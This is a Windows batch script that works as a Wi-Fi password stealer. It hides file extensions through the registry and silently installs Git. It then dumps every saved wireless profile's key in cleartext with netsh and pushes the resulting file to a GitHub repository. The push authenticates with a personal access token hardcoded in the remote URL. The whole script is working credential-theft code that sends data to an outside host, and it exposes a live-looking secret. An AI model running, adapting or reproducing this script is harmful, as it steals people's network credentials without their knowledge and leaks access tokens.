@echo off

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d 1 /f

REM kreiranje GitHub repo clone foldera
mkdir C:\EY\test
cd C:\EY\test\


where git >nul 2>nul
if %errorlevel% equ 0 (
    for /f "delims=" %%i in ('where git') do (
    	set "gitPath=%%i"
   	)
    goto :continue
) else (
    REM Download and install GitBash
    curl -LO https://github.com/git-for-windows/git/releases/download/v2.33.0.windows.2/Git-2.33.0.2-64-bit.exe
    start /wait Git-2.33.0.2-64-bit.exe /VERYSILENT /DIR="C:\EY\test"
    set "gitPath=C:\EY\test\cmd\git.exe"
)

:continue
REM neophodni config
"%gitPath%" config --global http.sslBackend schannel

REM clone GitHub repo
"%gitPath%" clone https://github.com/eytesttest/test.git
cd C:\EY\test\test

REM Auth to GitHub repo
"%gitPath%" init
"%gitPath%" config --global user.name "eytesttest"
"%gitPath%" config --global user.email "eyrenderedt@gmail.com"
"%gitPath%" remote add origin https://github.com/eytesttest/test.git
"%gitPath%" remote set-url origin https://eytesttest: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@github.com/eytesttest/test.git
"%gitPath%" fetch origin
"%gitPath%" switch main
"%gitPath%" pull origin

REM wifi passwords
setlocal EnableDelayedExpansion

set networkNames=
set /A numCharactersToRemove=23

for /f "tokens=*" %%n in ('netsh wlan show profile ^| findstr /r "^ *Profile"') do (
    set networkName=%%n
    set networkNames=!networkNames! "!networkName!"
    set "newName=!networkName:~%numCharactersToRemove%!"
netsh wlan show profile name="!newName!" key=clear >> C:\EY\test\test\Final.txt
)

REM kreiranje faila, commit i push na GitHub
"%gitPath%" add .
"%gitPath%" commit -m "Adding wifi file."
"%gitPath%" push origin
